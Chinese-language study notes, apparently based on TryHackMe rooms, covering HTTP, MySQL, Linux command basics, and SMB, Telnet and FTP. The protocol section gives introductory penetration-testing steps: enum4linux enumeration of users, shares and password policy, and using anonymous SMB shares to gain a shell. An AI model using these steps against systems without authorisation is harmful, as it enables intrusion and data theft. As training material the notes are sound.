    Welcome To TryHackMe.com
</body>
</html>

*要细分响应的每一行：*

第 1 行：HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码，在本例中为“200 Ok”，它告诉我们请求已成功完成。

第 2 行：这告诉我们 Web 服务器软件和版本号。

第 3 行： Web 服务器的当前日期、时间和时区。

第 4 行：Content-Type 标头告诉客户端要发送什么类型的信息，例如 HTML、图像、视频、pdf、XML。

第 5 行： Content-Length 告诉客户端响应的长度，这样我们就可以确认没有数据丢失。

第 6 行：HTTP响应包含一个空行以确认 HTTP 响应结束。

第 7-14 行：已请求的信息，在本例中为主页。





#### HTTP 方法 

HTTP方法是客户端在发出 HTTP 请求时显示其预期操作的一种方式。有很多 HTTP 方法，但我们将介绍最常见的方法，尽管大多数情况下您将处理 GET 和 POST 方法。

**GET Request**

这用于从 Web 服务器获取信息。

**POST Request**

这用于向 Web 服务器提交数据并可能创建新记录

**PUT Request**

这用于向网络服务器提交数据以更新信息

**DELETE Request**

这用于从网络服务器中删除信息/记录。





#### HTTP 状态代码 

当 HTTP 服务器响应时，第一行始终包含一个状态代码，通知客户端其请求的结果以及可能如何处理它。 这些状态码可以分为 5 个不同的范围： 

| 100-199 - 信息响应   | 这些 发送来告诉客户他们的请求的第一部分已经 已接受，他们应该继续发送其余请求。 这些代码不再常见 |
| :------------------- | :----------------------------------------------------------- |
| 200-299 - 成功       | 此范围的状态代码用于告诉客户端他们的请求已成功               |
| 300-399 - 重定向     | 这些 用于将客户端的请求重定向到另一个资源。 这个可以 要么是不同的网页，要么是完全不同的网站 |
| 400-499 - 客户端错误 | 用于通知客户端他们的请求有错误                               |
| 500-599 - 服务器错误 | 这 保留用于服务器端发生的错误，通常 表明处理请求的服务器存在相当大的问题 |



**常见的 HTTP 状态代码：**

有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：

|                 200 - OK                  | 请求已成功完成                                               |
| :---------------------------------------: | ------------------------------------------------------------ |
|               201 - Created               | 资源已创建（例如新用户或新博客文章）                         |
|     301 - Moved Permanently 永久移动      | 这将客户端的浏览器重定向到新网页或告诉搜索引擎该页面已移至其他位置并改为查看该位置 |
|                302 - Found                | 与上面的永久重定向类似，但顾名思义，这只是一个暂时的改变，并且在不久的将来可能会再次改变 |
|        400 - Bad Request 错误请求         | 这告诉浏览器有什么问题或者丢失了要求。 如果 Web 服务器资源是被请求需要一个客户端没有的特定参数发送 |
|        401 - Not Authorised 未授权        | 你不是目前允许查看此资源，直到您通过 Web 应用程序进行授权（最常见的是使用用户名和密码） |
|              403 - Forbidden              | 无论您是否登录，您都无权查看此资源                           |
|    405 - Method Not Allowed 方法不允许    | 该资源不允许该方法请求，例如您发送当资源 /create-account 期望 POST 时，对资源 /create-account 发出 GET 请求请求代替 |
|           404 - Page Not Found            | 您请求的页面/资源不存在                                      |
| 500 - Internal Service Error 内部服务错误 | 服务器在您的请求中遇到某种错误，它不知道如何正确处理         |
|   503 - Service Unavailable 服务不可用    | 该服务器无法处理您的请求，因为它已超载或因维护而停机。       |





#### 标头

标头Headers是您在发出请求时可以发送到 Web 服务器的额外数据位。虽然在发出 HTTP 请求时没有严格要求Headers，但您会发现很难正确查看网站。

**通用请求标头(Common Request Headers)**

﻿这些是从客户端（通常是您的浏览器）发送到服务器的标头。

Host主机：一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。

User-Agent：这是你的浏览器软件和版本号，告诉网络服务器你的浏览器软件帮助它为你的浏览器正确格式化网站，而且 HTML、JavaScript 和 CSS 的一些元素只在某些浏览器中可用。

Content-Length：当向 Web 服务器发送数据时，例如在表单中，内容长度告诉 Web 服务器在 Web 请求中期望有多少数据。这样服务器可以确保它不会丢失任何数据。

Accept-Encoding：告诉网络服务器浏览器支持什么类型的压缩方法，这样数据就可以变小以便通过互联网传输。

Cookie：发送到服务器以帮助记住您的信息的数据。

**通用响应头(Common Response Headers)**

这些是请求后从服务器返回给客户端的标头。

Set-Cookie：要存储的信息，在每次请求时都会发送回 Web 服务器。

Cache-Control：响应内容在再次请求之前在浏览器缓存中存储多长时间。

Content-Type：这告诉客户端返回的数据类型，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用内容类型标头，浏览器然后知道如何处理数据。

Content-Encoding内容编码：在通过 Internet 发送数据时，使用什么方法压缩数据以使其更小。





#### Cookie

您以前可能听说过 ，它们只是存储在您计算机上的一小段数据。当您从网络服务器收到“Set-Cookie”标头时，Cookie 将被保存。然后，您发出的每一个进一步请求，都会将 cookie 数据发送回网络服务器。由于 HTTP 是无状态的（不跟踪您之前的请求），cookie 可用于提醒网络服务器您的身份、网站的一些个人设置或您以前是否访问过该网站。

**HTTP 请求的示例：** 

<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/a2117dc267fbb169e38be77c7af44027.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/a2117dc267fbb169e38be77c7af44027.png" style="zoom: 50%;" />

Cookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是可以在其中看到密码的明文字符串，而是一个令牌（人类不容易猜到的唯一密码）。







### MySQL



**MySQL**

最简单的定义是，MySQL是一个基于结构化查询语言（Structured Query Language，SQL）的关系数据库管理系统（relational database management system，RDBMS）。  MySQL 使用3306端口。

数据库 Database：

数据库只是一个持久的、有组织的结构化数据集合

关系数据库管理系统 RDBMS：

用于创建和管理基于关系模型的数据库的软件或服务。 “关系”一词仅意味着存储在数据集中的数据以表的形式组织。 每个表都以某种方式与彼此的“主键”或其他“关键”因素相关。

**SQL：**

MYSQL 只是最流行的 RDBMS 软件实现之一的品牌名称。 众所周知，它使用客户端-服务器模型。 但是客户端和服务器如何通信呢？ 他们使用一种语言，特别是结构化查询语言（SQL）。

许多其他产品，例如 PostgreSQL 和 Microsoft SQL Server，都包含 SQL 一词。 这同样表明这是一个利用结构化查询语言语法的产品。

**MySQL 是如何工作的？**


MySQL 作为一个 RDBMS，由服务器和有助于管理 MySQL 数据库的实用程序组成。服务器处理所有数据库指令，例如创建、编辑和访问数据。 它接受并管理这些请求并使用 MySQL 协议进行通信。 这整个过程可以分为以下几个阶段：

    MySQL创建一个数据库来存储和操作数据，定义每个表的关系。
    客户端通过在 SQL 中发出特定语句来发出请求。
    服务器将使用所请求的任何信息来响应客户端。

什么运行 MySQL？

MySQL可以运行在各种平台上，无论是Linux还是Windows。 它通常用作许多著名网站的后端数据库，并构成 LAMP 堆栈的重要组件，其中包括：Linux、Apache、MySQL 和 PHP。 















## 2,Linux 基础知识



### inux 基础知识第 1 部分

#### 与文件系统交互命令

| 命令                          | 描述                                  |
| ----------------------------- | ------------------------------------- |
| ls (listing列表)              | 列出我们当前目录中的文件 (ls)         |
| cd (change directory)         | 更改当前目录 (cd)                     |
| cat (concatenate)             | 输出文件的内容 (cat)                  |
| pwd (print working directory) | 找出我们当前工作目录 (pwd) 的完整路径 |
| echo                          | 输出我们提供的任何文本                |
| whoami                        | 找出我们当前登录的用户                |



更多与文件系统交互的命令

| 命令  | 全名           | 目的             |
| ----- | -------------- | ---------------- |
| touch | touch          | 创建文件         |
| mkdir | make directory | 创建文件夹       |
| cp    | copy           | 复制文件或文件夹 |
| mv    | move           | 移动文件或文件夹 |
| rm    | remove         | 删除文件或文件夹 |
| file  | file           | 确定文件的类型   |

创建文件和文件夹（touch、mkdir）

在 Linux 上创建文件和文件夹是一个简单的过程。首先，我们将介绍创建一个文件。touch 命令只接受一个参数——我们要给我们创建的文件的名称。例如，我们可以使用touch note. 值得注意的是 touch 只是创建一个空白文件。您需要使用诸如 echo 之类的命令或诸如 nano 之类的文本编辑器来将内容添加到空白文件中。之后创建文件夹的类似过程，只涉及使用命令mkdir并提供我们要分配给目录的名称。例如，使用mkdir mydirectory创建目录“mydirectory” 。

 

删除文件和文件夹 (rm)

rm与我们到目前为止所介绍的命令相比，它非常出色。您可以简单地使用rm删除文件(rm note)。但是，您需要在要删除的目录名称旁边提供-R switch (rm -R mydirectory)。

 

复制和移动文件和文件夹（cp、mv）

复制和移动文件是 Linux 机器上的一项重要功能。从 cp开始，此命令有两个参数：1.现有文件的名称  2.复制时我们希望分配给新文件的名称

cp将现有文件的全部内容复制到新文件中。在下面的截图中，我们将“note”复制到“note2”，(cp note note2)。

移动文件需要两个参数，就像 cp 命令一样。但是，不是复制和/或创建新文件，mv而是合并或修改我们作为参数提供的第二个文件。您不仅可以用来mv将文件移动到新文件夹，还可以用来mv重命名文件或文件夹。例如，在下面的屏幕截图中，我们将文件“note2”重命名为“note3”。“note3”现在将具有“note2”的内容，(mv note2 note3)。

 

确定文件类型（file）

通常具有误导性并经常使人们感到困惑的是从文件中推测文件的目的或内容可能是什么。文件通常具有所谓的扩展名以简化此操作。例如，文本文件通常具有“.txt”的扩展名。但这不是必需的。到目前为止，我们在示例中使用的文件还没有扩展名。在不知道文件存在原因的上下文的情况下——我们真的不知道它的用途。输入file命令。该命令接受一个参数。例如，我们将使用file来确认我们例子中的“note”文件是否确实是一个文本文件，就像这样file note。





#### wget,curl,scp 命令

下载文件

可以使用以下命令下载这些文件： curl 和 wget

计算的一个非常基本的特征是传输文件的能力。例如，您可能想要下载程序、脚本甚至图片。**我们将介绍wget. 此命令允许我们通过HTTP从 Web 下载文件——就像您在浏览器中访问文件一样**。我们只需要提供我们希望下载的资源的地址。例如，如果我想下载一个名为“myfile.txt”的文件到我的机器上，假设我知道它的网址——它看起来像这样：wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt



**从您的主机传输文件 - SCP (SSH)**

安全复制（SCP），就是这样一种安全复制文件的方法。与常规 cp 命令不同，此命令允许您使用 SSH 协议在两台计算机之间传输文件，以提供身份验证和加密。

通过使用 SOURCE 和 DESTINATION 模型，SCP 允许您：

    将文件和目录从当前系统复制到远程系统
    将文件和目录从远程系统复制到当前系统 

前提是我们知道您当前系统上的用户和远程系统上的用户的用户名和密码。例如，让我们将一个示例文件从我们的机器复制到远程机器

|              Variable              |      Value      |
| :--------------------------------: | :-------------: |
|          远程系统的IP地址          |  192.168.1.30   |
|          远程系统上的用户          |     ubuntu      |
|        本地系统上的文件名称        |  important.txt  |
| 我们希望在远程系统上存储文件的名称 | transferred.txt |

有了这些信息，让我们来制作我们的scp命令（记住 SCP 的格式只是 SOURCE 和 DESTINATION）

**scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt**



现在让我们反转这个并设计用于从我们未登录的远程计算机复制文件的scp语法

|            Variable            |     Value     |
| :----------------------------: | :-----------: |
|        远程系统的IP地址        | 192.168.1.30  |
|        远程系统上的用户        |    ubuntu     |
|       远程系统上的文件名       | documents.txt |
| 我们希望在系统上存储文件的名称 |   notes.txt   |

该命令现在将如下所示：**scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt** 





#### 搜索文件

使用命令 Find

当我们不得不查看每一个文件只是为了尝试查找特定文件时，这变得令人头疼。我们可以用来find为我们做这件事！让我们从简单开始，假设我们已经知道要查找的文件的名称——但不记得它的确切位置！在这种情况下，我们正在寻找“passwords.txt”，如果我们记得文件名，我们可以简单地使用( **find -name passwords.txt** ) 命令将在我们当前目录中的每个文件夹中查找该特定文件。

“Find”已设法找到该文件——事实证明它位于 folder1/passwords.txt 中——太棒了。但是假设我们不知道文件的名称，或者想搜索每个扩展名为“.txt”的文件。我们可以简单地使用所谓的通配符 (*) 来搜索任何以 .txt 结尾的内容。在我们的例子中，我们想要找到当前目录中的每个 .txt 文件。我们将构建一个命令，( 例如 **find -name *.txt** ) “Find”已经能够找到每个 .txt 文件，然后给我们每个文件的位置



使用 Grep

另一个值得学习的实用工具是使用grep. 该grep命令允许我们在文件内容中搜索我们正在寻找的特定值。以 Web 服务器的访问日志为例。在这种情况下，Web 服务器的 access.log 有 244 个条目。我们可以使用grep此文件的全部内容来搜索我们正在搜索的值的任何条目。以Web服务器的访问日志为例，我们希望看到IP地址“81.143.211.90”访问过的所有内容（注意这是虚构的）( **tryhackme@linux1:~$ grep "81.143.211.90" access.log** )





#### Shell 操作符简介 

运算符：

| 符号/运算符 |                             描述                             |
| :---------: | :----------------------------------------------------------: |
|      &      |               该操作符允许您在终端后台运行命令               |
|     &&      |          该运算符允许您将多个命令组合在终端的一行中          |
|      >      | 该运算符是一个重定向器 - 这意味着我们可以从命令中获取输出（例如使用 cat 输出文件）并将其定向到其他地方 |
|     >>      | 这个运算符也是一个输出重定向器，就像>我们讨论的前面的运算符一样。但是，这个运算符的不同之处在于它不会覆盖文件中的任何内容 |



详细地介绍一下这些内容：

**Operator "&"**

该运算符允许我们在后台执行命令。例如，假设我们要复制一个大文件。这显然需要相当长的时间，并且在文件成功复制之前我们无法做任何其他事情。“&” shell 运算符允许我们执行命令并让它在后台运行（例如这个文件副本）允许我们做其他事情！

 

**Operator "&&"**

该运算符允许您在终端的一行中组合多个命令。我们可以使用“&&”来制作要运行的命令列表，例如command1 && command2。但是，值得注意的是，只有在成功command1时command2才会运行。

 

**Operator ">"**

这个运算符就是所谓的输出重定向器。这实质上意味着我们从运行的命令中获取输出并将该输出发送到其他地方。一个很好的例子是重定向echo我们在任务 4 中学到的命令输出。假设我们想创建一个名为“welcome”的文件，其中包含消息“hey”。我们可以echo hey > welcome在我们想要使用内容“hey”创建文件的地方运行，注意：如果文件ie“welcome”已经存在，内容将被覆盖。



**Operator ">>"**

这个运算符也是一个输出重定向器，像>我们讨论的前面的运算符 ( ) 一样。但是，这个运算符的不同之处在于它不会覆盖文件中的任何内容，例如，它只是将输出放在末尾。继续我们之前的例子，我们有文件“welcome”，其中包含“hey”的内容。如果使用 echo 使用> 运算符将“hello”添加到文件，则文件现在将只有“hello”而没有“hey”。运算>>符允许将输出附加到文件的底部，而不是像这样替换内容。





### Linux 基础知识第 2 部分

####  SSH 访问

使用 SSH 访问您的 Linux 机器

在Linux Fundamentals 第 1 部分中使用了浏览器内功能，让您直接连接到您的第一台 Linux 机器，没有任何麻烦。事实上，浏览器内功能使用的协议与我们今天将要使用的协议完全相同。该协议简称为Secure Shell 或SSH，是连接远程 Linux 机器命令行并与之交互的常用手段。

**SSH 及其工作原理**

Secure Shell 或 SSH 只是一种加密形式的设备之间的协议。SSH 允许我们远程在另一台设备上执行命令。在设备之间发送的任何数据在通过网络（例如 Internet）发送时都会被加密

**使用 SSH 登录到Linux机器**

使用 SSH 的语法非常简单。我们只需要提供两件事：1.远程机器的IP地址  2.将凭据更正为有效帐户以在远程计算机上登录

构造一个使用 SSH 登录远程机器的命令。这样做的命令是ssh帐户的用户名，@机器的 IP 地址。例如：**ssh 用户名@MACHINE_IP**





#### 命令参数

大多数命令允许提供参数。这些参数由一个连字符hyphen和一个称为标志flags或开关switches的特定关键字标识。

使用命令时，除非另有说明，否则它将执行其默认行为。例如， ls 列出工作目录的内容。但是，不会显示隐藏文件。我们可以使用flags和switches来扩展命令的行为。

例如:使用我们的ls示例，ls通知我们只有一个名为“folder1”的文件夹，但是，在使用**-a参数（缩写为--all）**之后，我们现在突然有了一个包含更多文件和文件夹的输出，现在我们突然有了一个包含更多文件和文件夹的输出，例如“.hiddenfolder”。  带有“.”的文件和文件夹 是隐藏文件。接受这些的命令也将有一个--help选项。此选项将列出该命令接受的可能选项，提供简要说明和如何使用它的示例。实际上，此选项是所谓的手册页man page（manual 的缩写）的格式化输出，其中包含 Linux 命令和应用程序的文档。



手册页man page

手册页是系统命令和应用程序的重要信息来源，可在 Linux 机器上使用，可在机器本身和网上访问。要访问此文档，我们可以使用man命令，然后提供我们想要阅读文档的命令。使用我们的 ls 示例，我们将像这样**man ls**查看手册页ls 





#### 权限

您现在已经发现，某些用户无法访问某些文件或文件夹。 我们之前已经探索过一些命令，这些命令可用于确定我们拥有哪些访问权限以及它会将我们引向何处。在之前的任务中，我们学习了如何通过标志和开关扩展命令的使用。 举个例子， ls命令，列出当前目录的内容。 **当使用 -l 切换后：ls -l**，可以查看权限

一个文件或文件夹可以有几个特性，这些特性决定了哪些操作是允许的，哪些用户或组有能力执行给定的操作——例如：读,写,执行 ,让我们在此任务顶部的初始屏幕截图中使用“cmnatic.pem”文件。它有“-”指示器突出显示它是一个文件，然后是“rw”。这意味着只有文件的所有者可以读写这个“cmnatic.pem”文件，但不能执行它。

**在用户之间切换**

多亏了su命令，在 Linux 安装上的用户之间切换很容易。除非你是 root 用户（或通过 sudo 使用 root 权限），否则你需要知道两件事来促进用户帐户的这种转换：1.我们希望切换到的用户，2.用户密码

该su命令需要几个可能与您相关的开关。例如，登录后执行命令或指定要使用的特定 shell。 我鼓励您阅读手册页以su了解更多信息。但是，我将介绍-lor--login开关。简单地说，通过提供-l开关，我们启动一个 shell，它更类似于登录系统的实际用户——我们继承了新用户的更多属性，即环境变量等。 例如，当使用su切换到“user2”时，我们的新会话会将我们拖放到以前用户的主目录中。 现在，在使用 su -l user2 之后-l，我们的新会话自动将我们放入“用户”的主目录中。





#### 公共目录

/etc

此根目录是系统中最重要的根目录之一。etc 文件夹（etcetera 的缩写）是存储操作系统使用的系统文件的常用位置。 

 

/var

“/var”目录（其中“var”是variable data的缩写）是 Linux 安装中的主要根文件夹之一。此文件夹存储系统上运行的服务或应用程序经常访问或写入的数据。例如，来自正在运行的服务和应用程序的日志文件写在这里 ( /var/log )，或者其他不一定与特定用户关联的数据（即数据库等）。

 

/root

与/home目录不同，/root 文件夹实际上是“root”系统用户的家。除了了解这是“root”用户的主目录之外，这个文件夹没有任何其他内容。但是，值得一提的是，根据逻辑假设，该用户的数据默认位于“ /home/root ”等目录中。 

 

/tmp

这是在 Linux 安装中找到的唯一根目录。/tmp 目录是“临时temporary”的缩写，它是易变的，用于存储只需要访问一次或两次的数据。和电脑内存一样，电脑重启后，这个文件夹的内容就被清空了。在渗透测试中对我们有用的是默认情况下任何用户都可以写入此文件夹。这意味着一旦我们可以访问一台机器，它就可以作为存储诸如我们的枚举脚本之类的东西的好地方。







### Linux 基础知识第 3 部分



#### 终端文本编辑器 

到目前为止，在整个系列中，我们只使用echo命令和管道运算符（>和>>）的组合将文本存储在文件中。当您处理多行和多类型的文件时，这不是处理数据的最有效方法。

引入终端文本编辑器

您可以使用几个选项，所有选项都具有各种友好性和实用性。此任务将向您介绍nano但也会向您展示一个名为vim的替代项。

**Nano**

使用 Nano 很容易上手！要使用 nano 创建或编辑文件，我们只需使用nano filename-- 将“文件名”替换为您要编辑的文件的名称。Nano 具有一些易于记忆的功能，涵盖了您希望从文本编辑器中获得的最通用的功能，包括：搜索文本，复制和粘贴，跳转到行号，找出你所在的行号。您可以通过按“ Ctrl ”键（在 Linux 上表示为^）和相应的字母来使用 nano 的这些功能。例如，要退出，我们会想按“ Ctrl ”和“ X ”来退出 Nano。



**VIM**

模式

Vim 中有三种基本模式：

    命令 模式是您可以运行命令的地方。 这是 Vim 启动的默认模式
    插入 模式是您插入即写入文本的地方
    可视 模式是您直观地选择一堆文本，以便您可以仅对文本的该部分运行命令/操作。 

VIM 是一个更高级的文本编辑器。虽然您不需要了解所有高级功能，但提及它有助于提高您的Linux技能。VIM 的一些好处，尽管需要更长的时间来熟悉，包括：可定制 - 您可以根据自己的选择修改 键盘快捷键，语法高亮 - 如果您正在编写或维护代码，这将非常有用，使其成为软件开发人员的热门选择，VIM 适用于所有可能未安装 nano 的终端，有很多资源可供您使用，例如备忘单、教程和各种资源。





#### Python3 的服务器模块

从您的主机提供文件服务 - WEB

Ubuntu 机器预装了 python3。 Python 提供了一个轻量级且易于使用的模块，称为“HTTPServer”。 该模块将您的计算机变成一个快速、简单的网络服务器，您可以使用它来服务您自己的文件，然后其他计算机可以使用以下命令下载这些文件： curl 和 wget。

Python3 的“HTTPServer”将为您运行命令的目录中的文件提供服务，但这可以通过提供可在手册页中找到的选项来更改。 简单来说，我们需要做的就是**运行 python3 -m  http.server启动模块**，在下面的屏幕截图中，我们从一个名为“webserver”的目录提供服务，该目录有一个名为“file”的目录。 

**使用Python启动Web服务器 ：**

tryhackme@linux3:/tmp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

现在，让我们使用 wget 使用计算机的 IP 地址和文件名下载文件。 该模块的一个缺陷是您无法建立索引，因此您必须知道要使用的文件的确切名称和位置。 这就是为什么我更喜欢使用Updog（https://github.com/sc0tfree/updog）    

 **使用 wget 从我们的网络服务器下载文件**

tryhackme@linux3:/tmp# wget http://127.0.0.1:8000/file

在上面的截图中，我们可以看到 wget已成功将名为“file”的文件下载到我们的计算机上。 这个请求由 SimpleHTTPServer 记录，就像任何 Web 服务器一样，我在下面的屏幕截图中捕获了这一点。 

**使用Python启动Web服务器** 

tryhackme@linux3:/tmp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [04/May/2021/14:26:09] "GET /file HTTP/1.1" 200 -





#### 进程

其中每个进程都有一个与之关联的 ID，也称为其 PID。PID 按照进程启动的顺序递增。

**查看进程**

我们可以使用友好的**ps命令**提供一个正在运行的进程列表作为我们的用户会话和一些附加信息，例如它的状态代码、正在运行它的会话、它使用的 CPU 的使用时间以及名称正在执行的实际程序或命令

<img src="https://assets.tryhackme.com/additional/linux-fundamentals/part3/ps1.png" alt="https://assets.tryhackme.com/additional/linux-fundamentals/part3/ps1.png" style="zoom:67%;" />

要查看其他用户运行的进程和不从会话运行的进程（即系统进程），我们需要像这样向ps命令提供aux ：**ps aux**

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105145707349.png" alt="image-20231105145707349" style="zoom:67%;" />

另一个非常有用的命令是 **top 命令**；top 为您提供有关系统上运行的进程的实时统计信息，而不是一次性视图。这些统计数据将每 10 秒刷新一次，但在您使用箭头键浏览各行时也会刷新。另一个深入了解系统的好命令是通过top命令

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105145845160.png" alt="image-20231105145845160" style="zoom: 67%;" />



**管理流程**

您可以发送终止进程的信号；有多种类型的信号与内核处理进程的确切程度相关。要终止命令，我们可以使用适当命名的kill 命令和我们希望终止的关联 PID。即，要终止 PID 1337，我们将使用**kill 1337**.

以下是我们可以在进程被终止时发送给进程的一些信号：

    SIGTERM - 终止进程，但允许它预先执行一些清理任务
    SIGKILL - 终止进程 - 事后不进行任何清理
    SIGSTOP - 停止/挂起进程 



**进程如何启动**

让我们首先讨论命名空间。 操作系统 ( OS ) 使用命名空间最终将计算机上的可用资源划分给进程（例如 CPU、RAM 和优先级）。 可以将其视为将计算机分成多个部分。 该切片内的进程将有权访问一定量的计算能力，但是，这只是每个进程实际可用的一小部分。

命名空间对于安全性非常有用，因为它是一种将进程与另一个进程隔离的方式——只有位于同一命名空间中的进程才能互相看到。

我们之前讨论过 PID 的工作原理，这就是它发挥作用的地方。 ID为0的进程是系统启动时启动的进程。 这个进程是Ubuntu上系统的init，例如 systemd ，它用于提供一种管理用户进程的方式，位于操作系统和用户之间。例如，一旦系统启动并初始化， systemd 就是第一个启动的进程之一。 我们想要启动的任何程序或软件都将作为 systemd 的子进程启动。 这意味着它由 systemd 的资源 控制，但将作为自己的进程运行（尽管共享systemd ），以便我们更容易识别等。 



**Linux后台和前台简介** 

进程可以在两种状态下运行：在后台和在前台。例如，您在终端中运行的命令（例如“echo”或类似的东西）将在终端的前台运行，因为它是唯一没有被告知在后台运行的命令。“Echo”是一个很好的例子，因为 echo 的输出将在前台返回给您，但不会在后台返回给您。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105150921465.png" alt="image-20231105150921465" style="zoom:67%;" />

我们在这里运行echo "Hi THM" ，我们希望输出像开始时一样返回给我们。但是在将&运算符添加到命令后**echo "Hi THM" &**，我们得到的只是回显进程的 ID 而不是实际输出——因为它在后台运行。

这对于复制文件等命令非常有用，因为这意味着我们可以在后台运行该命令并继续执行我们希望执行的任何其他命令（无需等待文件复制先完成）在执行脚本之类的事情时，我们可以做完全相同的事情——而不是依赖 & 运算符，我们可以**Ctrl + Z在我们的键盘上使用后台进程**。这也是“暂停”脚本或命令执行的有效方法

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105151504831.png" alt="image-20231105151504831" style="zoom:67%;" />



**前台处理**

现在我们有一个进程在后台运行，例如我们的脚本“background.sh”，可以通过命令 ps aux 确认，我们可以后退并将这个进程带回前台进行交互。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105151309144.png" alt="image-20231105151309144" style="zoom:67%;" />

在我们的进程后台使用Ctrl + Z或&运算符的情况下，我们fg可以像下面这样将其重新聚焦

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105151443179.png" alt="image-20231105151443179" style="zoom:67%;" />

我们可以看到 fg命令用于使后台进程重新在终端上使用，脚本的输出现在返回给我们。 









## 3,协议



### 网络服务协议

#### SMB

SMB - 服务器消息块协议Server Message Block Protocol - 是一种客户端-服务器通信协议，用于共享对网络上的文件、打印机、串行端口和其他资源的访问。

服务器使文件系统和其他资源（打印机、命名管道、API）可供网络上的客户端使用。客户端计算机可能有自己的硬盘，但它们也想访问服务器上的共享文件系统和打印机。

SMB 协议被称为响应请求协议，这意味着它在客户端和服务器之间传输多条消息以建立连接。客户端使用 TCP/IP（实际上是 RFC1001 和 RFC1002 中指定的 TCP/IP 上的 NetBIOS）、NetBEUI 或 IPX/SPX 连接到服务器。

SMB 如何运作？

一旦建立连接，客户端就可以向服务器发送命令 (SMB)，允许它们访问共享、打开文件、读取和写入文件，并且通常可以执行您想对文件系统执行的所有操作. 但是，对于 SMB，这些事情是通过网络完成的。

什么运行SMB？

自 Windows 95 以来的 Microsoft Windows 操作系统已包括客户端和服务器 SMB 协议支持。Samba 是一种支持 SMB 协议的开源服务器，针对 Unix 系统发布。



**枚举 SMB**

枚举 Enumeration

枚举是收集有关目标的信息以找到潜在的攻击向量并帮助利用的过程。此过程对于攻击的成功至关重要，因为将时间浪费在无效或可能导致系统崩溃的漏洞利用上可能会浪费能源。枚举可用于收集用户名、密码、网络信息、主机名、应用程序数据、服务或任何其他可能对攻击者有价值的信息。

SMB

通常，服务器上有 SMB 共享驱动器，可以连接并用于查看或传输文件。对于寻求发现敏感信息的攻击者来说，SMB 通常是一个很好的起点——您会对这些共享中有时包含的内容感到惊讶。

端口扫描

枚举的第一步是进行端口扫描，尽可能多地找出目标机器的服务、应用程序、结构和操作系统的信息。

Enum4linux

Enum4linux 是一个用于在 Windows 和 Linux 系统上枚举 SMB 共享的工具。它基本上是 Samba 包中工具的包装器，可以轻松快速地从与 SMB 相关的目标中提取信息。它默认安装在 Parrot 和 Kali 上，但是如果你需要安装它，你可以从官方github上安装。

Enum4Linux 的语法非常简单：“enum4linux [options] ip”

标签            功能

-U             get userlist
-M             get machine list
-N             get namelist dump (区别于-U和-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             以上所有（完整的基本枚举）



**利用 SMB** 

SMB 漏洞利用的类型

虽然存在诸如 CVE-2017-7494 之类的漏洞，可以允许通过利用 SMB 来远程执行代码，但您更有可能遇到这样的情况：进入系统的最佳方式是由于系统中的配置错误造成的。  在这种情况下，我们将**利用匿名（anonymous） SMB 共享访问**——这是一种常见的错误配置，它可以让我们获取导致 shell 的信息。

SMBClient 

因为我们正在尝试访问 SMB 共享，所以我们需要一个客户端来访问服务器上的资源。  我们将使用 SMBClient，因为它是默认 samba 套件的一部分。

 我们可以使用以下语法**远程访问 SMB 共享：smbclient //[IP]/[SHARE]**

接下来是标签：

 -U [名称] : 指定用户

 -p [端口] : 指定端口





#### Telnet

Telnet 是一种应用程序协议，允许您使用 telnet 客户端连接到托管 telnet 服务器的远程计算机并在其上执行命令。telnet 客户端将与服务器建立连接。 然后客户端将成为虚拟终端 - 允许您与远程主机交互。 

Telnet 以明文形式发送所有消息，没有特定的安全性机制。 因此，在许多应用程序和服务中，Telnet 在大多数实现中已被 SSH 取代。

Telnet 是如何工作的？

用户通过Telnet协议连接到服务器， 输入 “telnet” 意味着在命令提示符中 。 然后用户通过以下方式在服务器上执行命令 在 Telnet 提示符中使用特定的 Telnet 命令。 您可以使用以下语法连接到 telnet 服务器： **telnet [ip] [port]**



**利用 Telnet** 

Telnet 漏洞利用的类型

由于我们之前讨论过的原因，Telnet 作为一种协议本身并不安全。 它缺乏加密，因此通过明文发送所有通信，并且大多数情况下访问控制很差。 然而，Telnet 客户端和服务器系统有 CVE，因此在利用时，您可以检查以下内容：

    https://www.cvedetails.com/
    https://cve.mitre.org/ 

CVE 是常见漏洞和暴露的缩写 Common Vulnerabilities and Exposures，是一个列表公开披露的计算机安全漏洞。 当某人提到一个 CVE，通常是指分配给安全缺陷的 CVE ID 号。但是，您更有可能发现 telnet 的配置或操作方式存在错误配置，从而允许您利用它。





#### FTP

FTP（File Transfer Protocol 文件传输协议）是一种用于允许通过网络远程传输文件的协议。 它使用客户端-服务器模型来完成此操作，并且以非常有效的方式中继命令和数据。

 **FTP 是如何工作的？**
典型的 FTP 会话使用两个通道运行：

    命令（有时称为控件） 渠道
    数据通道。 

顾名思义，命令通道用于传输命令以及对这些命令的回复， 数据通道用于传输数据。

FTP 使用客户端-服务器协议运行。 客户端向服务器发起连接，服务器验证提供任何登录凭据，然后打开会话。当会话打开时，客户端可以在服务器上执行 FTP 命令。 

主动与被动

服务器 FTP 可以支持主动或被动连接，或两者都支持。

    在主动FTP连接中，客户端打开端口并侦听，服务器需要主动连接到它。
    在被动FTP连接中，服务器打开一个端口并监听（被动）客户端连接到它。 

